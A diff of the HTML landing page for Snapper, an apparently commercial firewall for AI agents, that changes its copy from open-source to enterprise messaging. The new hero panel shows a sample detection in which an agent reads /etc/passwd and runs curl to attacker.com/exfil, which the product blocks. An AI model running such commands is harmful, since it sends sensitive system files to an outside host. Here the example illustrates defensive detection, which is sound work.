@@ -4,15 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <base href="/">
-<title>Snapper — The Open-Source Agent Application Firewall</title>
-<meta name="description" content="Snapper gives your AI agents secure access to their full capabilities. PII vault, Telegram/Slack approvals, fail-closed rule engine. Supports Claude Code, Cursor, Windsurf, Cline, OpenClaw. Free for noncommercial use.">
+<title>Snapper — Agent Application Firewall for the Enterprise</title>
+<meta name="description" content="Snapper is the enterprise Agent Application Firewall. Bad actor detection, PII vault, kill chain analysis, SIEM integration, SSO/SAML, Telegram & Slack approvals. Protect your AI agents at the boundary.">
 <meta property="og:title" content="Snapper — Agent Application Firewall">
-<meta property="og:description" content="Open-source firewall for AI agents. PII vault + Telegram/Slack approvals + 15 rule types. Your agent keeps full power. You keep full control.">
+<meta property="og:description" content="Enterprise firewall for AI agents. Bad actor detection, PII vault, kill chain analysis, SIEM/SOAR integration. Your agents keep full power. You keep full control.">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://snapperprotect.com">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Snapper — Agent Application Firewall">
-<meta name="twitter:description" content="Open-source firewall for AI agents. PII vault + Telegram/Slack approvals + 15 rule types.">
+<meta name="twitter:description" content="Enterprise firewall for AI agents. Bad actor detection, kill chain analysis, PII vault, SIEM integration.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -113,19 +113,33 @@ nav {
   transition: color 0.15s;
 }
 .nav-links a:hover { color: var(--text-bright); text-decoration: none; }
-.btn-gh {
+.btn-signin {
   display: inline-flex;
   align-items: center;
   gap: 7px;
-  background: var(--text-bright);
-  color: var(--bg);
+  background: transparent;
+  color: var(--text);
+  font-size: 13px;
+  font-weight: 500;
+  padding: 7px 16px;
+  border-radius: 6px;
+  border: 1px solid var(--border-bright);
+  transition: all 0.15s;
+}
+.btn-signin:hover { border-color: var(--accent); color: var(--accent); text-decoration: none; }
+.btn-demo {
+  display: inline-flex;
+  align-items: center;
+  gap: 7px;
+  background: var(--accent);
+  color: #fff;
   font-size: 13px;
   font-weight: 600;
   padding: 7px 16px;
   border-radius: 6px;
   transition: opacity 0.15s;
 }
-.btn-gh:hover { opacity: 0.88; text-decoration: none; }
+.btn-demo:hover { opacity: 0.88; text-decoration: none; }
 
 /* ─── HERO ─── */
 .hero {
@@ -171,7 +185,7 @@ nav {
   font-size: 18px;
   font-weight: 400;
   color: var(--text-dim);
-  max-width: 600px;
+  max-width: 620px;
   line-height: 1.7;
   margin-bottom: 36px;
   opacity: 0;
@@ -214,7 +228,7 @@ nav {
 }
 .btn-secondary:hover { border-color: var(--text-dim); color: var(--text-bright); text-decoration: none; }
 
-/* ─── CODE SNIPPET ─── */
+/* ─── LOGO BAR ─── */
 .hero-code {
   margin-top: 48px;
   background: var(--bg-card);
@@ -489,7 +503,7 @@ nav {
   width: 100%;
   border-collapse: collapse;
   font-size: 13px;
-  min-width: 760px;
+  min-width: 860px;
 }
 .comp-table th {
   padding: 16px 14px;
@@ -548,7 +562,7 @@ nav {
 .stats { padding: 60px 0; border-top: 1px solid var(--border); }
 .stats-grid {
   display: grid;
-  grid-template-columns: repeat(6, 1fr);
+  grid-template-columns: repeat(4, 1fr);
   gap: 14px;
 }
 .stat-card {
@@ -572,13 +586,56 @@ nav {
 }
 @media (max-width: 768px) {
   .stats-grid {
-    grid-template-columns: repeat(3, 1fr);
-  }
-}
-@media (max-width: 480px) {
-  .stats-grid {
     grid-template-columns: repeat(2, 1fr);
   }
+}
+
+/* ─── ENTERPRISE ─── */
+.enterprise {
+  padding: 80px 0;
+  border-top: 1px solid var(--border);
+}
+.enterprise h2 {
+  font-size: clamp(28px, 4vw, 40px);
+  font-weight: 800;
+  color: var(--text-bright);
+  letter-spacing: -1px;
+  margin-bottom: 12px;
+  text-align: center;
+}
+.enterprise .subtitle {
+  font-size: 16px;
+  color: var(--text-dim);
+  text-align: center;
+  max-width: 600px;
+  margin: 0 auto 48px;
+}
+.enterprise-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 20px;
+}
+.enterprise-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 28px;
+  transition: border-color 0.2s;
+}
+.enterprise-card:hover { border-color: var(--border-bright); }
+.enterprise-card h3 {
+  font-size: 16px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin-bottom: 10px;
+}
+.enterprise-card p {
+  font-size: 14px;
+  color: var(--text-dim);
+  line-height: 1.7;
+}
+@media (max-width: 768px) {
+  .enterprise-grid { grid-template-columns: 1fr; }
 }
 
 /* ─── SECURITY & TRUST ─── */
@@ -672,22 +729,10 @@ nav {
   font-size: 16px;
   color: var(--text-dim);
   margin-bottom: 32px;
-  max-width: 480px;
+  max-width: 520px;
   margin-left: auto;
   margin-right: auto;
 }
-.cta-code {
-  display: inline-block;
-  background: var(--bg-card);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  padding: 14px 28px;
-  font-family: var(--font-mono);
-  font-size: 14px;
-  color: var(--text);
-  margin-bottom: 24px;
-}
-.cta-code .cmd { color: var(--accent); }
 
 /* ─── FOOTER ─── */
 footer {
@@ -711,10 +756,9 @@ footer a:hover { color: var(--accent); }
 
 /* ─── RESPONSIVE ─── */
 @media (max-width: 768px) {
-  .nav-links a:not(.btn-gh) { display: none; }
+  .nav-links a:not(.btn-signin):not(.btn-demo) { display: none; }
   .hero { padding: 110px 0 60px; }
   .features-grid { grid-template-columns: 1fr; }
-  .stats-grid { grid-template-columns: repeat(2, 1fr); }
   .agents-grid { gap: 8px; }
   .agent-chip { padding: 8px 14px; font-size: 13px; }
 }
@@ -731,17 +775,18 @@ footer a:hover { color: var(--accent); }
         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
       </svg>
       Snapper
-      <span class="nav-tag">OPEN SOURCE</span>
+      <span class="nav-tag">ENTERPRISE</span>
     </div>
     <div class="nav-links">
       <a href="#features">Features</a>
       <a href="#architecture">Architecture</a>
       <a href="#comparison">Compare</a>
-      <a href="#security-trust">Security</a>
-      <a href="https://github.com/jmckinley/snapper" class="btn-gh">
-        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
-        GitHub
+      <a href="#enterprise">Enterprise</a>
+      <a href="https://app.snapperprotect.com/login" class="btn-signin">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+        Sign In
       </a>
+      <a href="mailto:john@mckinleylabs.com" class="btn-demo">Request Demo</a>
     </div>
   </div>
 </nav>
@@ -749,30 +794,28 @@ footer a:hover { color: var(--accent); }
 <!-- HERO -->
 <section class="hero">
   <div class="container">
-    <div class="hero-eyebrow">The first open-source Agent Application Firewall (AAF)</div>
-    <h1>Your agent keeps <span class="accent">full power.</span><br>You keep full control.</h1>
-    <p class="hero-sub">Snapper hooks into your AI agent's tool pipeline and evaluates every action before it executes. Approve sensitive operations from Telegram or Slack. Keep PII in an encrypted vault the agent never touches. Source available, free for noncommercial use.</p>
+    <div class="hero-eyebrow">The first Agent Application Firewall (AAF)</div>
+    <h1>Your agents keep <span class="accent">full power.</span><br>Your SOC keeps full control.</h1>
+    <p class="hero-sub">Snapper intercepts every AI agent action before it executes. Heuristic bad actor detection, kill chain analysis, encrypted PII vault, SIEM integration, and human-in-the-loop approvals via Telegram or Slack. Enterprise-grade security without crippling agent capability.</p>
     <div class="hero-actions">
-      <a href="https://github.com/jmckinley/snapper" class="btn-primary">
-        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
-        View on GitHub
+      <a href="mailto:john@mckinleylabs.com" class="btn-primary">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+        Request a Demo
       </a>
       <a href="#features" class="btn-secondary">See how it works</a>
     </div>
     <div class="hero-code">
       <div class="code-bar">
         <div class="code-dot"></div><div class="code-dot"></div><div class="code-dot"></div>
-        <span>terminal</span>
+        <span>snapper threat detection — live</span>
       </div>
       <div class="code-body">
-<span class="comment"># Install and start Snapper</span>
-<span class="cmd">git clone</span> https://github.com/jmckinley/snapper.git
-<span class="cmd">cd</span> snapper && <span class="cmd">./setup.sh</span>
-
-<span class="comment"># Auto-detect your agent, register, and apply security profile</span>
-<span class="cmd">python</span> scripts/snapper-cli.py <span class="arg">init</span>
-
-<span class="comment"># That's it. Snapper is protecting your agent.</span>
+<span class="comment"># Snapper detects multi-step attack patterns in real time</span>
+<span class="cmd">agent</span> reads /etc/passwd              <span class="comment"># Signal: FILE_READ (sensitive path)</span>
+<span class="cmd">agent</span> runs curl attacker.com/exfil     <span class="comment"># Signal: NETWORK_SEND (external dest)</span>
+<span class="arg">→ Kill chain matched:</span> data_exfiltration  <span class="comment"># 2-stage state machine triggered</span>
+<span class="arg">→ Threat score:</span> 41.0 / 100             <span class="comment"># Composite: signals + baseline + chains</span>
+<span class="arg">→ Action:</span> <span style="color: var(--red);">BLOCKED</span> + alert sent to SOC  <span class="comment"># Score > threshold → automatic deny</span>
       </div>
     </div>
   </div>
@@ -781,14 +824,14 @@ footer a:hover { color: var(--accent); }
 <!-- AGENTS BAR -->
 <section class="agents-bar">
   <div class="container">
-    <div class="agents-label">Supported agents — auto-detected, one-command setup</div>
+    <div class="agents-label">Protects every major AI agent platform — deploy in minutes</div>
     <div class="agents-grid">
       <div class="agent-chip"><span class="agent-dot"></span>OpenClaw</div>
       <div class="agent-chip"><span class="agent-dot"></span>Claude Code</div>
       <div class="agent-chip"><span class="agent-dot"></span>Cursor</div>
       <div class="agent-chip"><span class="agent-dot"></span>Windsurf</div>
       <div class="agent-chip"><span class="agent-dot"></span>Cline</div>
-      <div class="agent-chip"><span class="agent-dot"></span>Custom</div>
+      <div class="agent-chip"><span class="agent-dot"></span>Custom MCP</div>
     </div>
   </div>
 </section>
@@ -797,8 +840,8 @@ footer a:hover { color: var(--accent); }
 <section class="problem">
   <div class="container">
     <h2>The problem</h2>
-    <div class="statement">Today, AI agents can run any command, fill payment forms, access credential files, and install plugins — with zero oversight.</div>
-    <p>Today you either trust the agent completely and accept the risk, or restrict it so heavily it can barely function.</p>
+    <div class="statement">Your AI agents can run commands, access credentials, exfiltrate data, and install plugins. Your security team has zero visibility.</div>
+    <p>Enterprises face a binary choice: deploy AI agents with full access and accept the risk, or restrict them so heavily they can't deliver value. Neither option works when you're responsible for compliance, data protection, and incident response.</p>
   </div>
 </section>
 
@@ -806,8 +849,8 @@ footer a:hover { color: var(--accent); }
 <section class="solution">
   <div class="container">
     <h2 class="solution-label">The solution</h2>
-    <div class="statement">Snapper eliminates the tradeoff. Your agent keeps its full capabilities. You approve what matters from your phone or desktop.</div>
-    <p>Snapper hooks into your agent's tool pipeline and evaluates every action against configurable rules — before it executes. Sensitive operations route to Telegram or Slack for human approval. Your PII lives in an encrypted vault the agent never touches. The result: full agent power with full human control.</p>
+    <div class="statement">Snapper eliminates the tradeoff. Agents keep full capability. Your security team gets full visibility, real-time threat detection, and human-in-the-loop control.</div>
+    <p>Snapper hooks into the agent's tool pipeline and evaluates every action against configurable rules before it executes. Heuristic bad actor detection identifies multi-step attack patterns. Kill chain state machines catch data exfiltration, credential theft, and privilege escalation in real time. Sensitive operations route to Telegram or Slack for human approval. PII lives in an AES-256-GCM encrypted vault the agent never touches. CEF/Syslog events flow to your SIEM. The result: full agent power with enterprise-grade governance.</p>
   </div>
 </section>
 
@@ -815,49 +858,63 @@ footer a:hover { color: var(--accent); }
 <section class="features" id="features">
   <div class="container">
     <div class="features-header">
-      <h2>Seven things no one else does</h2>
-      <p>Snapper enables full agent capability instead of restricting it.</p>
+      <h2>Built for the enterprise</h2>
+      <p>Eight capabilities no other agent security tool provides.</p>
     </div>
     <div class="features-grid">
 
       <div class="feature-card highlight">
+        <div class="feature-icon red">🎯</div>
+        <h3>Bad Actor Detection Engine</h3>
+        <p>Heuristic threat detection on every request. 13 signal types extracted in under 2ms. 7 kill chain state machines detect multi-step attacks: data exfiltration, credential theft, PII harvesting, encoded exfil, privilege escalation, vault extraction, and living-off-the-land. Per-agent behavioral baselines detect anomalies. Composite scoring from 0-100 with automatic deny above threshold.</p>
+        <span class="mono-detail">13 signals &middot; 7 kill chains &middot; &lt;2ms hot path &middot; behavioral baselines &middot; composite scoring</span>
+      </div>
+
+      <div class="feature-card highlight">
         <div class="feature-icon green">🔐</div>
-        <h3>PII Vault</h3>
-        <p>Your credit cards, addresses, and SSNs live in Fernet-encrypted storage. The agent only sees tokens like <code>{{SNAPPER_VAULT:a7f3b2c1e4d5f6a8...}}</code>. When it fills a payment form, you get a Telegram or Slack notification showing masked values, the destination, and the dollar amount. Approve from your phone or desktop.</p>
-        <span class="mono-detail">AES-128-CBC + HMAC-SHA256 · HKDF · 30s TTL · domain-locked tokens</span>
+        <h3>Encrypted PII Vault</h3>
+        <p>Credit cards, SSNs, addresses, and API keys live in AES-256-GCM encrypted storage. Agents only see tokens like <code>{{SNAPPER_VAULT:a7f3b2c1...}}</code>. When the agent fills a payment form, you get a notification showing masked values, the destination, and the dollar amount. Approve from your phone. Tokens are domain-locked with 30-second TTL and one-read expiry.</p>
+        <span class="mono-detail">AES-256-GCM &middot; HKDF key derivation &middot; 30s TTL &middot; domain-locked &middot; one-read expiry</span>
       </div>
 
       <div class="feature-card highlight">
         <div class="feature-icon blue">📱</div>
         <h3>Telegram & Slack Command Center</h3>
-        <p>Approve actions, manage rules, test commands, control your PII vault, and hit the emergency kill switch — all from your phone or desktop. Choose Telegram (inline buttons) or Slack (slash commands + Block Kit). When a sensitive action fires, you get a rich notification with [Approve] / [Deny] buttons. Five seconds, done.</p>
-        <span class="mono-detail">Telegram: /block · /vault · /test · /rules · /pii · /trust · /dashboard &nbsp;|&nbsp; Slack: /snapper-block · /snapper-vault · /snapper-test · /snapper-dashboard</span>
+        <p>Approve actions, manage rules, test commands, control your PII vault, and hit the emergency kill switch — all from your phone or desktop. Rich notifications with [Approve] / [Deny] buttons. Full Slack parity with 12 slash commands and Block Kit. Five seconds from alert to decision.</p>
+        <span class="mono-detail">Telegram inline buttons &middot; Slack slash commands &middot; Block Kit &middot; Emergency kill switch</span>
       </div>
 
       <div class="feature-card highlight">
         <div class="feature-icon red">🛡️</div>
         <h3>Defense in Depth</h3>
-        <p>15 rule types with a fail-closed engine. Blocks reverse shells, RCE, destructive commands, credential access, and 341+ malicious skills from the ClawHavoc campaign. Scans every tool call for raw PII across 30+ patterns. No rules = deny. Errors = deny.</p>
-        <span class="mono-detail">CVE-2026-25253 · CVE-2026-25157 · CVE-2026-24891</span>
+        <p>16 rule types with a fail-closed engine. Blocks reverse shells, RCE, destructive commands, credential access, and 341+ malicious skills from the ClawHavoc campaign. Scans every tool call for raw PII across 30+ regex patterns. Threat score overrides add behavioral intelligence on top of static rules. No rules = deny. Errors = deny.</p>
+        <span class="mono-detail">16 rule types &middot; 341+ malicious skills &middot; 30+ PII patterns &middot; CVE coverage</span>
       </div>
 
       <div class="feature-card">
         <div class="feature-icon amber">⚡</div>
         <h3>Adaptive Trust Scoring</h3>
-        <p>Agents earn autonomy through consistent good behavior. Rate-limit violations reduce trust, which tightens limits. Score ranges from 0.5 to 2.0 and directly scales what the agent can do. Per-agent opt-in — enabled when you're ready.</p>
+        <p>Agents earn autonomy through consistent good behavior. Rate-limit violations reduce trust scores, which tightens limits. Score ranges from 0.5x to 2.0x and directly scales what the agent can do. Per-agent opt-in gives security teams precise control over automation thresholds.</p>
       </div>
 
       <div class="feature-card">
         <div class="feature-icon purple">🔍</div>
-        <h3>Raw PII Interception</h3>
-        <p>Even if the agent finds PII by reading a file or scraping a website, Snapper catches it. 30+ regex patterns scan every tool call for credit cards, SSNs, emails, API keys, and more — across US, UK, Canada, and Australia formats.</p>
+        <h3>SIEM & SOAR Integration</h3>
+        <p>CEF-formatted syslog events for every security action: rule evaluations, threat detections, kill chain completions, approvals, denials, and quarantine actions. Drop-in integration with Splunk, Sentinel, QRadar, and any CEF-compatible SOAR. Full audit trail with structured JSON logging.</p>
+        <span class="mono-detail">CEF/Syslog &middot; Splunk &middot; Sentinel &middot; QRadar &middot; Structured JSON</span>
       </div>
 
       <div class="feature-card">
         <div class="feature-icon green">📊</div>
         <h3>Traffic Discovery</h3>
-        <p>Snapper detects MCP servers and tools from live traffic automatically. See which commands your agents use and add curated security rules with one click. Known servers get full rule packs; unknown servers get smart defaults. 40+ known servers recognized out of the box.</p>
-        <span class="mono-detail">Auto-detect · 40+ known servers · Curated rule packs · Smart defaults</span>
+        <p>Auto-detect MCP servers and tools from live traffic. See which commands your agents use and add curated security rules with one click. 40+ known servers recognized out of the box with specialized rule packs. Unknown servers get smart defaults.</p>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon blue">🏢</div>
+        <h3>Multi-Tenant & SSO</h3>
+        <p>Organization-scoped agents, rules, and audit trails. SAML 2.0 and OIDC single sign-on. SCIM provisioning for automated user lifecycle management. Role-based access control with admin, member, and viewer roles. Per-org billing and quota enforcement.</p>
+        <span class="mono-detail">SAML 2.0 &middot; OIDC &middot; SCIM &middot; RBAC &middot; Multi-org isolation</span>
       </div>
 
     </div>
@@ -875,13 +932,20 @@ footer a:hover { color: var(--accent); }
    <span class="node">Hook intercepts</span> (PreToolUse — auto-installed)
         │
         ▼
-   <span class="node">Snapper</span> evaluates (15 rule types · priority-sorted · fail-closed)
+   <span class="node">Snapper evaluates</span> (16 rule types · threat scoring · fail-closed)
         │
         ├── <span class="allow">ALLOW</span>    → agent proceeds (vault tokens resolved)
-        ├── <span class="deny">DENY</span>     → blocked, Telegram/Slack alert sent
-        └── <span class="approve">APPROVAL</span> → Telegram/Slack notification with [Approve] / [Deny]
+        ├── <span class="deny">DENY</span>     → blocked, alert sent to SOC / Telegram / Slack
+        └── <span class="approve">APPROVAL</span> → notification with [Approve] / [Deny]
                      → agent pauses, polls for your decision
-                     → on approve: vault tokens decrypted, 30s TTL, one read</div>
+                     → on approve: vault tokens decrypted, 30s TTL, one read
+        │
+        ▼
+   <span class="node">Threat Analysis</span> (async, every request)
+        ├── Signal extraction (13 types, &lt;2ms)
+        ├── Kill chain state machine progression
+        ├── Behavioral baseline comparison
+        └── Composite score → CEF event → SIEM</div>
   </div>
 </section>
 
@@ -889,7 +953,7 @@ footer a:hover { color: var(--accent); }
 <section class="comparison" id="comparison">
   <div class="container">
     <h2>How Snapper compares</h2>
-    <p class="subtitle">Different tools solve different problems at different layers. Snapper is the only open-source tool at the agent-internet boundary that enables full capability.</p>
+    <p class="subtitle">Different tools solve different problems at different layers. Snapper is the only solution at the agent-internet boundary with full threat detection and human-in-the-loop control.</p>
     <div class="comp-table-wrap">
       <table class="comp-table">
         <thead>
@@ -897,33 +961,38 @@ footer a:hover { color: var(--accent); }
             <th></th>
             <th class="snapper-col">Snapper</th>
             <th>LlamaFirewall</th>
-            <th>Cloudflare</th>
-            <th>Radware</th>
-            <th>GitHub</th>
+            <th>Lasso Security</th>
+            <th>Cloudflare AI GW</th>
+            <th>Prompt Security</th>
+            <th>Robust Intel</th>
           </tr>
         </thead>
         <tbody>
-          <tr class="cat-row"><td colspan="6">Snapper-Unique</td></tr>
-          <tr><td>Encrypted PII Vault</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Human-in-the-Loop via Telegram/Slack</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Raw PII Interception (DLP)</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Domain-Locked Vault Tokens</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Malicious Skill Blocking</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Adaptive Trust Scoring</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Emergency Kill Switch</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>MCP Traffic Discovery</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr class="cat-row"><td colspan="6">Architecture</td></tr>
-          <tr><td>Layer</td><td class="snapper-col" style="color:var(--accent);font-size:12px">Agent boundary</td><td style="font-size:12px">Inside agent</td><td style="font-size:12px">Edge network</td><td style="font-size:12px">Platform</td><td style="font-size:12px">Domain list</td></tr>
-          <tr><td>Philosophy</td><td class="snapper-col" style="color:var(--accent);font-size:12px;font-weight:600">Enable</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td></tr>
-          <tr><td>Open Source</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Self-Hosted</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td></tr>
-          <tr><td>Fail-Closed Design</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td></tr>
-          <tr><td>Multi-Agent (5+)</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td></tr>
+          <tr class="cat-row"><td colspan="7">Threat Detection</td></tr>
+          <tr><td>Kill Chain Detection</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Behavioral Baselines</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Composite Threat Scoring</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Heuristic Signal Extraction</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td></tr>
+          <tr class="cat-row"><td colspan="7">Data Protection</td></tr>
+          <tr><td>Encrypted PII Vault</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Raw PII Interception (DLP)</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="partial">~</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Domain-Locked Vault Tokens</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr class="cat-row"><td colspan="7">Governance</td></tr>
+          <tr><td>Human-in-the-Loop (Telegram/Slack)</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Adaptive Trust Scoring</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Emergency Kill Switch</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>CEF/SIEM Integration</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td></tr>
+          <tr class="cat-row"><td colspan="7">Architecture</td></tr>
+          <tr><td>Layer</td><td class="snapper-col" style="color:var(--accent);font-size:12px">Agent boundary</td><td style="font-size:12px">Inside agent</td><td style="font-size:12px">Prompt layer</td><td style="font-size:12px">Edge network</td><td style="font-size:12px">Prompt layer</td><td style="font-size:12px">Model layer</td></tr>
+          <tr><td>Philosophy</td><td class="snapper-col" style="color:var(--accent);font-size:12px;font-weight:600">Enable + Protect</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td><td style="font-size:12px">Restrict</td></tr>
+          <tr><td>Self-Hosted / On-Prem</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td><td><span class="cross">✗</span></td></tr>
+          <tr><td>Fail-Closed Design</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td><td><span class="check">✓</span></td></tr>
+          <tr><td>Multi-Agent (10+)</td><td class="snapper-col"><span class="check">✓</span></td><td><span class="partial">~</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td><td><span class="partial">~</span></td><td><span class="cross">✗</span></td></tr>
         </tbody>
       </table>
     </div>
     <div class="comp-note">
-      <strong>Note:</strong> Snapper and LlamaFirewall are complementary, not competitive. LlamaFirewall operates <em>inside</em> the agent (prompt injection, CoT auditing, code analysis). Snapper operates at the <em>boundary</em> between the agent and the outside world. Use both for defense in depth.
+      <strong>Note:</strong> Snapper operates at the boundary between the agent and the outside world — the action layer. Prompt-layer tools (LlamaFirewall, Lasso, Prompt Security) operate inside the agent on prompts and responses. These are complementary: use Snapper for action governance plus a prompt-layer tool for injection defense. Together they provide true defense in depth.
     </div>
   </div>
 </section>
